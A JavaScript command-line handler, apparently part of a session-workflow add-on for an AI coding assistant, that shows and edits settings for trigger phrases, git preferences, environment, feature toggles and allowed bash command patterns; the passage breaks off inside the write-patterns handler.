#!/usr/bin/env node

// ==== IMPORTS ===== //

// ===== LOCAL ===== //
const { loadConfig, editConfig, TriggerCategory, GitAddPattern, GitCommitStyle, UserOS, UserShell, CCTools, IconStyle } = require('../hooks/shared_state.js');

//-#

// ==== GLOBALS ===== //
//-#

// ==== FUNCTIONS ===== //

//!> Main config handler
function handleConfigCommand(args, jsonOutput = false, fromSlash = false) {
    /**
     * Handle configuration commands.
     *
     * Usage:
     *     config                          - Show full config
     *     config phrases <operation>      - Manage trigger phrases
     *     config git <operation>          - Manage git preferences
     *     config env <operation>          - Manage environment settings
     *     config features <operation>     - Manage feature toggles
     *     config validate                 - Validate configuration
     */
    // Handle help command specially for slash command integration
    if (!args || args.length === 0 || (args.length > 0 && ['help', ''].includes(args[0].toLowerCase()))) {
        if (fromSlash && (!args || args.length === 0 || args[0].toLowerCase() === 'help')) {
            return formatConfigHelp();
        } else if (!args || args.length === 0) {
            // Show full config when no args
            const config = loadConfig();
            if (jsonOutput) {
                return config.toDict();
            }
            return formatConfigHuman(config);
        }
    }

    const section = args[0].toLowerCase();
    const sectionArgs = args.length > 1 ? args.slice(1) : [];

    // Handle show command
    if (section === 'show') {
        const config = loadConfig();
        if (jsonOutput) {
            return config.toDict();
        }
        return formatConfigHuman(config);
    } else if (['trigger', 'triggers', 'phrases'].includes(section)) {
        return handlePhrasesCommand(sectionArgs, jsonOutput, fromSlash);
    } else if (section === 'git') {
        return handleGitCommand(sectionArgs, jsonOutput, fromSlash);
    } else if (section === 'env') {
        return handleEnvCommand(sectionArgs, jsonOutput, fromSlash);
    } else if (section === 'features') {
        return handleFeaturesCommand(sectionArgs, jsonOutput, fromSlash);
    } else if (section === 'read') {
        return handleReadCommand(sectionArgs, jsonOutput, fromSlash);
    } else if (section === 'write') {
        return handleWriteCommand(sectionArgs, jsonOutput, fromSlash);
    } else if (section === 'tools') {
        return handleToolsCommand(sectionArgs, jsonOutput, fromSlash);
    } else if (['readonly', 'perms'].includes(section)) {
        return handleReadonlyCommand(sectionArgs, jsonOutput, fromSlash);
    } else if (section === 'validate') {
        return validateConfig(jsonOutput);
    } else {
        if (fromSlash) {
            return `Unknown command: ${section}\n\n${formatConfigHelp()}`;
        }
        throw new Error(`Unknown config section: ${section}. Valid sections: phrases, git, env, features, read, write, tools, readonly, validate`);
    }
}

function formatConfigHelp() {
    /**Format help output for slash command.*/
    const lines = [
        "Sessions Configuration Commands:",
        "",
        "  /sessions config show           - Display current configuration",
        "  /sessions config trigger ...    - Manage trigger phrases",
        "  /sessions config git ...        - Manage git preferences",
        "  /sessions config env ...        - Manage environment settings",
        "  /sessions config features ...   - Manage feature toggles",
        "  /sessions config read ...       - Manage bash read patterns",
        "  /sessions config write ...      - Manage bash write patterns",
        "  /sessions config tools ...      - Manage implementation-only tools",
        "  /sessions config read ...   - Manage readonly bash commands",
        "",
        "Use '/sessions config <section> help' for section-specific help"
    ];
    return lines.join('\n');
}

function formatConfigHuman(config) {
    /**Format full config for human reading.*/
    // Helper to safely get value from enum or string
    const getValue = (field) => {
        return typeof field === 'object' && field.value !== undefined ? field.value : field;
    };

    const lines = [
        "=== Sessions Configuration ===",
        "",
        "Trigger Phrases:"
    ];

    for (const category of Object.values(TriggerCategory)) {
        const phrases = config.trigger_phrases[category] || [];
        if (phrases.length > 0) {
            lines.push(`  ${category}: ${phrases.join(', ')}`);
        }
    }

    lines.push(...[
        "",
        "Git Preferences:",
        `  Add Pattern: ${getValue(config.git_preferences.add_pattern)}`,
        `  Default Branch: ${config.git_preferences.default_branch}`,
        `  Commit Style: ${getValue(config.git_preferences.commit_style)}`,
        `  Auto Merge: ${config.git_preferences.auto_merge}`,
        `  Auto Push: ${config.git_preferences.auto_push}`,
        `  Has Submodules: ${config.git_preferences.has_submodules}`,
        "",
        "Environment:",
        `  OS: ${getValue(config.environment.os)}`,
        `  Shell: ${getValue(config.environment.shell)}`,
        `  Developer Name: ${config.environment.developer_name}`,
        "",
        "Features:",
        `  Branch Enforcement: ${config.features.branch_enforcement}`,
        `  Task Detection: ${config.features.task_detection}`,
        `  Auto Ultrathink: ${config.features.auto_ultrathink}`,
        `  Icon Style: ${getValue(config.features.icon_style)}`,
        `  Context Warnings (85%): ${config.features.context_warnings.warn_85}`,
        `  Context Warnings (90%): ${config.features.context_warnings.warn_90}`,
    ]);

    return lines.join('\n');
}
//!<

//!> Trigger phrases handlers
function handlePhrasesCommand(args, jsonOutput = false, fromSlash = false) {
    /**
     * Handle trigger phrase commands.
     *
     * Usage:
     *     config phrases list [category]
     *     config phrases add <category> "<phrase>"
     *     config phrases remove <category> "<phrase>"
     *     config phrases clear <category>
     */
    if (!args || args.length === 0 || (args.length > 0 && args[0].toLowerCase() === 'help')) {
        if (fromSlash) {
            return formatPhrasesHelp();
        }
        // List all phrases
        const config = loadConfig();
        const phrases = config.trigger_phrases.listPhrases();
        if (jsonOutput) {
            return { phrases: phrases };
        }
        return formatPhrasesHuman(phrases);
    }

    const action = args[0].toLowerCase();

    // Map friendly category names for slash commands
    function mapCategory(cat) {
        if (!fromSlash) {
            return cat;
        }
        const mapping = {
            'go': 'implementation_mode',
            'no': 'discussion_mode',
            'create': 'task_creation',
            'start': 'task_startup',
            'complete': 'task_completion',
            'compact': 'context_compaction'
        };
        return mapping[cat] || cat;
    }

    if (action === 'list') {
        const config = loadConfig();
        let phrases;
        if (args.length > 1) {
            // List specific category
            const category = mapCategory(args[1]);
            phrases = config.trigger_phrases.listPhrases(category);
        } else {
            // List all
            phrases = config.trigger_phrases.listPhrases();
        }

        if (jsonOutput) {
            return { phrases: phrases };
        }
        return formatPhrasesHuman(phrases);

    } else if (action === 'add') {
        if (args.length < 2) {
            if (fromSlash) {
                return "Missing category for add command\nUsage: /sessions config trigger add <category> <phrase>\nValid categories: go, no, create, start, complete, compact\n\nExample: /sessions config trigger add go 'proceed'";
            }
            throw new Error('Usage: config phrases add <category> "<phrase>"');
        }

        const category = mapCategory(args[1]);

        // Check for valid category
        const validCategories = ['implementation_mode', 'discussion_mode', 'task_creation', 'task_startup', 'task_completion', 'context_compaction'];
        if (!validCategories.includes(category)) {
            if (fromSlash) {
                return `Invalid category '${args[1]}'\nValid categories: go, no, create, start, complete, compact\n\nUse '/sessions config trigger help' for more info`;
            }
            throw new Error(`Invalid category: ${category}`);
        }

        // Collect remaining args as phrase
        if (args.length < 3) {
            if (fromSlash) {
                return "Missing phrase to add\nUsage: /sessions config trigger add <category> <phrase>\n\nExample: /sessions config trigger add go 'proceed'";
            }
            throw new Error("Missing phrase");
        }

        const phrase = args.slice(2).join(' ');

        let added = false;
        editConfig(config => {
            added = config.trigger_phrases.addPhrase(category, phrase);
        });

        if (jsonOutput) {
            return { added: added, category: category, phrase: phrase };
        }
        if (added) {
            return `Added '${phrase}' to ${category}`;
        } else {
            return `'${phrase}' already exists in ${category}`;
        }

    } else if (action === 'remove') {
        if (args.length < 2) {
            if (fromSlash) {
                return "Missing category for remove command\nUsage: /sessions config trigger remove <category> <phrase>\nValid categories: go, no, create, start, complete, compact";
            }
            throw new Error('Usage: config phrases remove <category> "<phrase>"');
        }

        const category = mapCategory(args[1]);

        // Check for valid category
        const validCategories = ['implementation_mode', 'discussion_mode', 'task_creation', 'task_startup', 'task_completion', 'context_compaction'];
        if (!validCategories.includes(category)) {
            if (fromSlash) {
                return `Invalid category '${args[1]}'\nValid categories: go, no, create, start, complete, compact\n\nUse '/sessions config trigger help' for more info`;
            }
            throw new Error(`Invalid category: ${category}`);
        }

        // Collect remaining args as phrase
        if (args.length < 3) {
            if (fromSlash) {
                return "Missing phrase to remove\nUsage: /sessions config trigger remove <category> <phrase>";
            }
            throw new Error("Missing phrase");
        }

        const phrase = args.slice(2).join(' ');

        let removed = false;
        editConfig(config => {
            removed = config.trigger_phrases.removePhrase(category, phrase);
        });

        if (jsonOutput) {
            return { removed: removed, category: category, phrase: phrase };
        }
        if (removed) {
            return `Removed '${phrase}' from ${category}`;
        } else {
            return `'${phrase}' not found in ${category}`;
        }

    } else if (action === 'clear') {
        if (args.length < 2) {
            throw new Error("Usage: config phrases clear <category>");
        }

        const category = args[1];

        editConfig(config => {
            // Clear the category by setting it to empty list
            const categoryEnum = config.trigger_phrases._coaxPhraseType(category);
            config.trigger_phrases[categoryEnum] = [];
        });

        if (jsonOutput) {
            return { cleared: category };
        }
        return `Cleared all phrases in ${category}`;

    } else if (action === 'show') {
        // Show specific category
        if (args.length < 2) {
            throw new Error("Usage: config phrases show <category>");
        }

        const category = args[1];
        const config = loadConfig();
        const phrases = config.trigger_phrases.listPhrases(category);

        if (jsonOutput) {
            return { phrases: phrases };
        }
        return formatPhrasesHuman(phrases);

    } else {
        if (fromSlash) {
            return `Unknown trigger command: ${action}\n\n${formatPhrasesHelp()}`;
        }
        throw new Error(`Unknown phrases action: ${action}. Valid actions: list, add, remove, clear, show`);
    }
}

function formatPhrasesHelp() {
    /**Format phrases help for slash command.*/
    const lines = [
        "Trigger Phrase Commands:",
        "",
        "  /sessions config trigger list [category]           - List trigger phrases",
        "  /sessions config trigger add <category> <phrase>   - Add trigger phrase",
        "  /sessions config trigger remove <category> <phrase> - Remove trigger phrase",
        "",
        "Categories:",
        "  go       - implementation_mode triggers (yert, make it so, run that)",
        "  no       - discussion_mode triggers (stop, silence)",
        "  create   - task_creation triggers (mek:, mekdis)",
        "  start    - task_startup triggers (start^, begin task:)",
        "  complete - task_completion triggers (finito)",
        "  compact  - context_compaction triggers (lets compact, squish)"
    ];
    return lines.join('\n');
}

function formatPhrasesHuman(phrases) {
    /**Format phrases for human reading.*/
    const lines = ["Trigger Phrases:"];
    for (const [category, phraseList] of Object.entries(phrases)) {
        if (phraseList && phraseList.length > 0) {
            lines.push(`  ${category}:`);
            for (const phrase of phraseList) {
                lines.push(`    - ${phrase}`);
            }
        } else {
            lines.push(`  ${category}: (none)`);
        }
    }
    return lines.join('\n');
}
//!<

//!> Git preferences handlers
function handleGitCommand(args, jsonOutput = false, fromSlash = false) {
    /**
     * Handle git preference commands.
     *
     * Usage:
     *     config git show
     *     config git set <key> <value>
     */
    if (!args || args.length === 0 || ['help', ''].includes(args[0].toLowerCase())) {
        if (fromSlash) {
            return formatGitHelp();
        }
        // If not from slash and no args, show git preferences
        if (!args || args.length === 0) {
            return handleGitShow(jsonOutput);
        }
    }

    if (args && args[0] === 'show') {
        return handleGitShow(jsonOutput);
    }

    // Handle old 'set' command or direct subcommands
    const action = args[0].toLowerCase();
    let key, value;

    // Map direct subcommands to set operations
    if (['add', 'branch', 'commit', 'merge', 'push', 'repo'].includes(action)) {
        key = action;
        if (args.length < 2) {
            if (fromSlash) {
                return formatGitMissingValue(key);
            }
            throw new Error(`Missing value for git ${key}`);
        }
        value = action === 'branch' ? args.slice(1).join(' ') : args[1];
    } else if (action === 'set') {
        if (args.length < 3) {
            if (fromSlash) {
                return "Missing key and value\nUsage: /sessions config git <setting> <value>";
            }
            throw new Error("Usage: config git set <key> <value>");
        }
        key = args[1].toLowerCase();
        value = args[2];
    } else {
        if (fromSlash) {
            return `Unknown git command: ${action}\n\n${formatGitHelp()}`;
        }
        throw new Error(`Unknown git command: ${args[0]}`);
    }

    editConfig(config => {
        if (['add', 'add_pattern'].includes(key)) {
            // Validate value is valid
            if (!['ask', 'all'].includes(value)) {
                if (fromSlash) {
                    throw new Error(`Invalid value '${value}' for git add\nValid options: ask (prompt for files) or all (stage everything)\n\nUse '/sessions config git help' for more info`);
                }
                throw new Error(`Invalid add pattern: ${value}. Valid options: ask, all`);
            }
            config.git_preferences.add_pattern = value;

        } else if (['branch', 'default_branch'].includes(key)) {
            config.git_preferences.default_branch = value;

        } else if (['commit', 'commit_style'].includes(key)) {
            // Map friendly values
            let style = value;
            if (fromSlash) {
                const styleMap = { 'reg': 'conventional', 'simp': 'simple', 'op': 'detailed' };
                style = styleMap[value] || value;
            }
            // Validate style is valid
            if (!['conventional', 'simple', 'detailed'].includes(style)) {
                if (fromSlash) {
                    throw new Error(`Invalid style '${value}'\nValid styles: conventional, simple, detailed\n  conventional - feat: add feature (conventional commits)\n  simple       - Add feature (simple descriptions)\n  detailed     - Add feature with extended description\n\nUse '/sessions config git help' for more info`);
                }
                throw new Error(`Invalid commit style: ${value}. Valid options: conventional, simple, detailed`);
            }
            config.git_preferences.commit_style = style;

        } else if (['merge', 'auto_merge'].includes(key)) {
            if (fromSlash) {
                if (value === 'auto') {
                    config.git_preferences.auto_merge = true;
                } else if (value === 'ask') {
                    config.git_preferences.auto_merge = false;
                } else {
                    throw new Error(`Invalid value '${value}' for merge\nValid options: auto (merge automatically) or ask (prompt first)\n\nUse '/sessions config git help' for more info`);
                }
            } else {
                config.git_preferences.auto_merge = ['true', 'yes', '1', 'auto'].includes(value.toLowerCase());
            }

        } else if (['push', 'auto_push'].includes(key)) {
            if (fromSlash) {
                if (value === 'auto') {
                    config.git_preferences.auto_push = true;
                } else if (value === 'ask') {
                    config.git_preferences.auto_push = false;
                } else {
                    throw new Error(`Invalid value '${value}' for push\nValid options: auto (push automatically) or ask (prompt first)\n\nUse '/sessions config git help' for more info`);
                }
            } else {
                config.git_preferences.auto_push = ['true', 'yes', '1', 'auto'].includes(value.toLowerCase());
            }

        } else if (['repo', 'has_submodules'].includes(key)) {
            if (fromSlash) {
                if (value === 'super') {
                    config.git_preferences.has_submodules = true;
                } else if (value === 'mono') {
                    config.git_preferences.has_submodules = false;
                } else {
                    throw new Error(`Invalid value '${value}' for repo type\nValid options: super (has submodules) or mono (single repo)\n\nUse '/sessions config git help' for more info`);
                }
            } else {
                config.git_preferences.has_submodules = ['true', 'yes', '1', 'super'].includes(value.toLowerCase());
            }

        } else {
            if (fromSlash) {
                throw new Error(`Unknown git setting: ${key}\n\n${formatGitHelp()}`);
            }
            throw new Error(`Unknown git setting: ${key}`);
        }
    });

    if (jsonOutput) {
        return { updated: key, value: value };
    }
    return `Updated git ${key} to ${value}`;
}

function handleGitShow(jsonOutput = false) {
    /**Show git preferences.*/
    const config = loadConfig();
    const gitPrefs = config.git_preferences;

    // Helper to safely get value from enum or string
    const getValue = (field) => {
        return typeof field === 'object' && field.value !== undefined ? field.value : field;
    };

    if (jsonOutput) {
        return {
            git_preferences: {
                add_pattern: getValue(gitPrefs.add_pattern),
                default_branch: gitPrefs.default_branch,
                commit_style: getValue(gitPrefs.commit_style),
                auto_merge: gitPrefs.auto_merge,
                auto_push: gitPrefs.auto_push,
                has_submodules: gitPrefs.has_submodules,
            }
        };
    }

    const lines = [
        "Git Preferences:",
        `  Add Pattern: ${getValue(gitPrefs.add_pattern)}`,
        `  Default Branch: ${gitPrefs.default_branch}`,
        `  Commit Style: ${getValue(gitPrefs.commit_style)}`,
        `  Auto Merge: ${gitPrefs.auto_merge}`,
        `  Auto Push: ${gitPrefs.auto_push}`,
        `  Has Submodules: ${gitPrefs.has_submodules}`,
    ];
    return lines.join('\n');
}

function formatGitHelp() {
    /**Format git help for slash command.*/
    const lines = [
        "Git Preference Commands:",
        "",
        "  /sessions config git show                - Display git preferences",
        "  /sessions config git add <ask|all>       - Set staging behavior",
        "  /sessions config git branch <name>       - Set default branch",
        "  /sessions config git commit <style>      - Set commit style",
        "    Styles: conventional, simple, detailed",
        "  /sessions config git merge <auto|ask>    - Set merge behavior",
        "  /sessions config git push <auto|ask>     - Set push behavior",
        "  /sessions config git repo <super|mono>   - Set repository type"
    ];
    return lines.join('\n');
}

function formatGitMissingValue(key) {
    /**Format missing value error for git settings.*/
    const messages = {
        'add': "Missing value for git add\nOptions: ask (prompt for files) or all (stage everything)\n\nUsage: /sessions config git add <ask|all>",
        'branch': "Missing branch name\nUsage: /sessions config git branch <name>\n\nExample: /sessions config git branch main",
        'commit': "Missing commit style\nValid styles: conventional, simple, detailed\n\nUsage: /sessions config git commit <style>",
        'merge': "Missing merge preference\nOptions: auto (merge automatically) or ask (prompt first)\n\nUsage: /sessions config git merge <auto|ask>",
        'push': "Missing push preference\nOptions: auto (push automatically) or ask (prompt first)\n\nUsage: /sessions config git push <auto|ask>",
        'repo': "Missing repository type\nOptions: super (has submodules) or mono (single repo)\n\nUsage: /sessions config git repo <super|mono>"
    };
    return messages[key] || `Missing value for git ${key}`;
}
//!<

//!> Environment settings handlers
function handleEnvCommand(args, jsonOutput = false, fromSlash = false) {
    /**
     * Handle environment setting commands.
     *
     * Usage:
     *     config env show
     *     config env set <key> <value>
     */
    if (!args || args.length === 0 || ['help', ''].includes(args[0].toLowerCase())) {
        if (fromSlash) {
            return formatEnvHelp();
        }
        // If not from slash and no args, show env settings
        if (!args || args.length === 0) {
            return handleEnvShow(jsonOutput);
        }
    }

    if (args && args[0] === 'show') {
        return handleEnvShow(jsonOutput);
    }

    // Handle old 'set' command or direct subcommands
    const action = args[0].toLowerCase();
    let key, value;

    // Map direct subcommands to set operations
    if (['os', 'shell', 'name'].includes(action)) {
        key = action;
        if (args.length < 2) {
            if (fromSlash) {
                return formatEnvMissingValue(key);
            }
            throw new Error(`Missing value for env ${key}`);
        }
        value = action === 'name' ? args.slice(1).join(' ') : args[1];
    } else if (action === 'set') {
        if (args.length < 3) {
            if (fromSlash) {
                return "Missing key and value\nUsage: /sessions config env <setting> <value>";
            }
            throw new Error("Usage: config env set <key> <value>");
        }
        key = args[1].toLowerCase();
        value = ['developer_name', 'name'].includes(key) ? args.slice(2).join(' ') : args[2];
    } else {
        if (fromSlash) {
            return `Unknown env command: ${action}\n\n${formatEnvHelp()}`;
        }
        throw new Error(`Unknown env command: ${args[0]}`);
    }

    editConfig(config => {
        if (key === 'os') {
            // Map friendly values
            let osVal = value;
            if (fromSlash) {
                const osMap = { 'mac': 'macos', 'win': 'windows' };
                osVal = osMap[value.toLowerCase()] || value.toLowerCase();
            }
            // Validate OS value is valid
            if (!['linux', 'macos', 'windows'].includes(osVal)) {
                if (fromSlash) {
                    throw new Error(`Invalid OS '${value}'\nValid options: linux, macos, windows\n\nUse '/sessions config env help' for more info`);
                }
                throw new Error(`Invalid os: ${value}. Valid values: linux, macos, windows`);
            }
            config.environment.os = osVal;

        } else if (key === 'shell') {
            // Map friendly values
            let shellVal = value;
            if (fromSlash) {
                const shellMap = { 'pwr': 'powershell' };
                shellVal = shellMap[value.toLowerCase()] || value.toLowerCase();
            }
            // Validate shell value is valid
            if (!['bash', 'zsh', 'fish', 'powershell', 'cmd'].includes(shellVal)) {
                if (fromSlash) {
                    throw new Error(`Invalid shell '${value}'\nValid options: bash, zsh, fish, powershell, cmd\n\nUse '/sessions config env help' for more info`);
                }
                throw new Error(`Invalid shell: ${value}. Valid values: bash, zsh, fish, powershell, cmd`);
            }
            config.environment.shell = shellVal;

        } else if (['developer_name', 'name'].includes(key)) {
            config.environment.developer_name = value;

        } else {
            if (fromSlash) {
                throw new Error(`Unknown env setting: ${key}\n\n${formatEnvHelp()}`);
            }
            throw new Error(`Unknown environment setting: ${key}`);
        }
    });

    if (jsonOutput) {
        return { updated: key, value: value };
    }
    return `Updated env ${key} to ${value}`;
}

function handleEnvShow(jsonOutput = false) {
    /**Show environment settings.*/
    const config = loadConfig();
    const env = config.environment;

    // Helper to safely get value from enum or string
    const getValue = (field) => {
        return typeof field === 'object' && field.value !== undefined ? field.value : field;
    };

    if (jsonOutput) {
        return {
            environment: {
                os: getValue(env.os),
                shell: getValue(env.shell),
                developer_name: env.developer_name,
            }
        };
    }

    const lines = [
        "Environment Settings:",
        `  OS: ${getValue(env.os)}`,
        `  Shell: ${getValue(env.shell)}`,
        `  Developer Name: ${env.developer_name}`,
    ];
    return lines.join('\n');
}

function formatEnvHelp() {
    /**Format env help for slash command.*/
    const lines = [
        "Environment Commands:",
        "",
        "  /sessions config env show            - Display environment settings",
        "  /sessions config env os <os>         - Set operating system",
        "    Options: linux, macos, windows",
        "  /sessions config env shell <shell>   - Set shell preference",
        "    Options: bash, zsh, fish, powershell, cmd",
        "  /sessions config env name <name>     - Set developer name"
    ];
    return lines.join('\n');
}

function formatEnvMissingValue(key) {
    /**Format missing value error for env settings.*/
    const messages = {
        'os': "Missing operating system\nValid options: linux, macos, windows\n\nUsage: /sessions config env os <os>",
        'shell': "Missing shell preference\nValid options: bash, zsh, fish, powershell, cmd\n\nUsage: /sessions config env shell <shell>",
        'name': "Missing developer name\nUsage: /sessions config env name <name>\n\nExample: /sessions config env name John"
    };
    return messages[key] || `Missing value for env ${key}`;
}
//!<

//!> Feature toggles handlers
function handleFeaturesCommand(args, jsonOutput = false, fromSlash = false) {
    /**
     * Handle feature toggle commands.
     *
     * Usage:
     *     config features show
     *     config features set <key> <value>
     *     config features toggle <key>
     */
    // Handle help request and no args
    if (!args || args.length === 0) {
        return handleFeaturesCommand(['show'], jsonOutput, fromSlash);
    }

    if (args[0].toLowerCase() === 'help') {
        return formatFeaturesHelp();
    }

    const action = args[0].toLowerCase();

    if (action === 'show') {
        // Show feature toggles
        const config = loadConfig();
        const features = config.features;

        // Helper to safely get value from enum or string
        const getValue = (field) => {
            return typeof field === 'object' && field.value !== undefined ? field.value : field;
        };

        if (jsonOutput) {
            return {
                features: {
                    branch_enforcement: features.branch_enforcement,
                    task_detection: features.task_detection,
                    auto_ultrathink: features.auto_ultrathink,
                    icon_style: getValue(features.icon_style),
                    warn_85: features.context_warnings.warn_85,
                    warn_90: features.context_warnings.warn_90,
                }
            };
        }

        const lines = [
            "Feature Toggles:",
            `  branch_enforcement: ${features.branch_enforcement}`,
            `  task_detection: ${features.task_detection}`,
            `  auto_ultrathink: ${features.auto_ultrathink}`,
            `  icon_style: ${getValue(features.icon_style)}`,
            `  warn_85: ${features.context_warnings.warn_85}`,
            `  warn_90: ${features.context_warnings.warn_90}`,
        ];
        return lines.join('\n');
    }

    if (action === 'set') {
        if (args.length < 3) {
            throw new Error("Usage: config features set <key> <value>");
        }

        const key = args[1].toLowerCase();
        const value = args[2];
        let finalValue;

        editConfig(config => {
            if (['task_detection', 'auto_ultrathink', 'branch_enforcement'].includes(key)) {
                // Boolean features
                const boolValue = ['true', '1', 'yes', 'on'].includes(value.toLowerCase());
                config.features[key] = boolValue;
                finalValue = boolValue;

            } else if (key === 'icon_style') {
                // Enum feature - accepts nerd_fonts, emoji, ascii
                const lowerValue = value.toLowerCase();
                const validValues = Object.values(IconStyle);
                if (!validValues.includes(lowerValue)) {
                    throw new Error(`Invalid icon_style value: ${value}. Valid values: nerd_fonts, emoji, ascii`);
                }
                config.features.icon_style = lowerValue;
                finalValue = lowerValue;

            } else if (['warn_85', 'warn_90'].includes(key)) {
                // Context warning features
                const boolValue = ['true', '1', 'yes', 'on'].includes(value.toLowerCase());
                config.features.context_warnings[key] = boolValue;
                finalValue = boolValue;

            } else {
                throw new Error(`Unknown feature: ${key}`);
            }
        });

        if (jsonOutput) {
            return { updated: key, value: finalValue };
        }
        return `Updated features.${key} to ${finalValue}`;

    } else if (action === 'toggle') {
        if (args.length < 2) {
            throw new Error("Usage: config features toggle <key>");
        }

        const key = args[1].toLowerCase();

        // Get current value
        const config = loadConfig();
        let currentValue;
        if (['task_detection', 'auto_ultrathink', 'branch_enforcement'].includes(key)) {
            currentValue = config.features[key];
        } else if (key === 'icon_style') {
            currentValue = config.features.icon_style;
        } else if (['warn_85', 'warn_90'].includes(key)) {
            currentValue = config.features.context_warnings[key];
        } else {
            throw new Error(`Unknown feature: ${key}`);
        }

        // Toggle/cycle the value
        let newValue;
        if (key === 'icon_style') {
            // Cycle through enum values: nerd_fonts -> emoji -> ascii -> nerd_fonts
            const cycle = [IconStyle.NERD_FONTS, IconStyle.EMOJI, IconStyle.ASCII];
            const currentIdx = cycle.indexOf(currentValue);
            newValue = cycle[(currentIdx + 1) % cycle.length];
        } else {
            // Boolean toggle
            newValue = !currentValue;
        }

        // Save the toggled value
        editConfig(config => {
            if (['task_detection', 'auto_ultrathink', 'branch_enforcement'].includes(key)) {
                config.features[key] = newValue;
            } else if (key === 'icon_style') {
                config.features.icon_style = newValue;
            } else if (['warn_85', 'warn_90'].includes(key)) {
                config.features.context_warnings[key] = newValue;
            }
        });

        // Format values for display
        const oldDisplay = typeof currentValue === 'object' && currentValue.value !== undefined ? currentValue.value : currentValue;
        const newDisplay = typeof newValue === 'object' && newValue.value !== undefined ? newValue.value : newValue;

        if (jsonOutput) {
            return { toggled: key, old_value: oldDisplay, new_value: newDisplay };
        }
        return `Toggled ${key}: ${oldDisplay} → ${newDisplay}`;

    } else {
        if (fromSlash) {
            return `Unknown features action: ${action}\n\n${formatFeaturesHelp()}`;
        }
        throw new Error(`Unknown features action: ${action}. Valid actions: show, set, toggle`);
    }
}

function formatFeaturesHelp() {
    /**Format features help for slash command.*/
    const lines = [
        "Feature Toggle Commands:",
        "",
        "  /sessions config features show              - Display all feature flags",
        "  /sessions config features set <key> <value> - Set feature value",
        "  /sessions config features toggle <key>      - Toggle feature boolean",
        "",
        "Available Features:",
        "  branch_enforcement  - Git branch validation (default: true)",
        "  task_detection      - Task-based workflow automation (default: true)",
        "  auto_ultrathink     - Enhanced AI reasoning (default: true)",
        "  icon_style          - Statusline icon style: nerd_fonts, emoji, or ascii (default: nerd_fonts)",
        "  warn_85             - Context warning at 85% (default: true)",
        "  warn_90             - Context warning at 90% (default: true)",
        "",
        "Examples:",
        "  /sessions config features toggle icon_style          # Cycles through nerd_fonts -> emoji -> ascii",
        "  /sessions config features set icon_style emoji       # Set to emoji icons",
        "  /sessions config features set auto_ultrathink false",
        "  /sessions config features toggle branch_enforcement"
    ];
    return lines.join('\n');
}
//!<

//!> Readonly commands handlers
function handleReadonlyCommand(args, jsonOutput = false, fromSlash = false) {
    /**
     * Handle custom readonly command management.
     *
     * Usage:
     *     config read list              - List all custom readonly commands
     *     config read add <command>     - Add a command to readonly list
     *     config read remove <command>  - Remove a command from readonly list
     */
    if (!args || args.length === 0 || args[0] === 'list') {
        // List all readonly commands
        const config = loadConfig();
        const commands = config.blocked_actions.listReadonlyCommands();

        if (jsonOutput) {
            return { readonly_commands: commands };
        }

        if (commands.length > 0) {
            const lines = ["Custom Readonly Commands:"];
            for (const cmd of commands) {
                lines.push(`  - ${cmd}`);
            }
            return lines.join('\n');
        } else {
            return "No custom readonly commands configured";
        }
    }

    const action = args[0].toLowerCase();

    if (action === 'add') {
        if (args.length < 2) {
            throw new Error("Usage: config read add <command>");
        }

        const command = args[1];
        let added = false;

        editConfig(config => {
            added = config.blocked_actions.addReadonlyCommand(command);
        });

        if (jsonOutput) {
            return { added: added, command: command };
        }
        if (added) {
            return `Added '${command}' to readonly commands`;
        } else {
            return `'${command}' already exists in readonly commands`;
        }

    } else if (action === 'remove') {
        if (args.length < 2) {
            throw new Error("Usage: config read remove <command>");
        }

        const command = args[1];
        let removed = false;

        editConfig(config => {
            removed = config.blocked_actions.removeReadonlyCommand(command);
        });

        if (jsonOutput) {
            return { removed: removed, command: command };
        }
        if (removed) {
            return `Removed '${command}' from readonly commands`;
        } else {
            return `'${command}' not found in readonly commands`;
        }

    } else {
        throw new Error(`Unknown readonly action: ${action}. Valid actions: list, add, remove`);
    }
}
//!<

//!> Bash read patterns handlers
function handleReadCommand(args, jsonOutput = false, fromSlash = false) {
    /**
     * Handle bash read pattern management.
     *
     * Usage:
     *     config read list              - List all bash read patterns
     *     config read add <pattern>     - Add a pattern to read list
     *     config read remove <pattern>  - Remove a pattern from read list
     */
    if (!args || args.length === 0 || args[0] === 'list') {
        // List all read patterns
        const config = loadConfig();
        const patterns = config.blocked_actions.bash_read_patterns;

        if (jsonOutput) {
            return { bash_read_patterns: patterns };
        }

        if (patterns && patterns.length > 0) {
            const lines = ["Bash Read Patterns (allowed in discussion mode):"];
            for (const pattern of patterns) {
                lines.push(`  - ${pattern}`);
            }
            return lines.join('\n');
        } else {
            return "No custom bash read patterns configured";
        }
    }

    const action = args[0].toLowerCase();

    if (action === 'add') {
        if (args.length < 2) {
            if (fromSlash) {
                return "Missing pattern for add command\nUsage: /sessions config read add <pattern>\n\nExample: /sessions config read add 'docker ps'";
            }
            throw new Error("Usage: config read add <pattern>");
        }

        const pattern = args.slice(1).join(' ');
        let added = false;

        editConfig(config => {
            if (!config.blocked_actions.bash_read_patterns.includes(pattern)) {
                config.blocked_actions.bash_read_patterns.push(pattern);
                added = true;
            }
        });

        if (jsonOutput) {
            return { added: added, pattern: pattern };
        }
        if (added) {
            return `Added '${pattern}' to bash read patterns`;
        } else {
            return `'${pattern}' already exists in bash read patterns`;
        }

    } else if (action === 'remove') {
        if (args.length < 2) {
            if (fromSlash) {
                return "Missing pattern for remove command\nUsage: /sessions config read remove <pattern>";
            }
            throw new Error("Usage: config read remove <pattern>");
        }

        const pattern = args.slice(1).join(' ');
        let removed = false;

        editConfig(config => {
            const index = config.blocked_actions.bash_read_patterns.indexOf(pattern);
            if (index !== -1) {
                config.blocked_actions.bash_read_patterns.splice(index, 1);
                removed = true;
            }
        });

        if (jsonOutput) {
            return { removed: removed, pattern: pattern };
        }
        if (removed) {
            return `Removed '${pattern}' from bash read patterns`;
        } else {
            return `'${pattern}' not found in bash read patterns`;
        }

    } else {
        if (fromSlash) {
            return `Unknown read command: ${action}\n\nValid actions: list, add, remove\n\nUsage:\n  /sessions config read list\n  /sessions config read add <pattern>\n  /sessions config read remove <pattern>`;
        }
        throw new Error(`Unknown read action: ${action}. Valid actions: list, add, remove`);
    }
}
//!<

//!> Bash write patterns handlers
function handleWriteCommand(args, jsonOutput = false, fromSlash = false) {
    /**
     * Handle bash write pattern management.
     *
     * Usage:
     *     config write list              - List all bash write patterns
     *     config write add <pattern>     - Add a pattern to write list
     *     config write remove <pattern>  - Remove a pattern from write list
     */
    if (!args || args.length === 0 || args[0] === 'list') {
        // List all write patterns
        const config = loadConfig();
        const patterns = config.blocked_actions.bash_write_patterns;

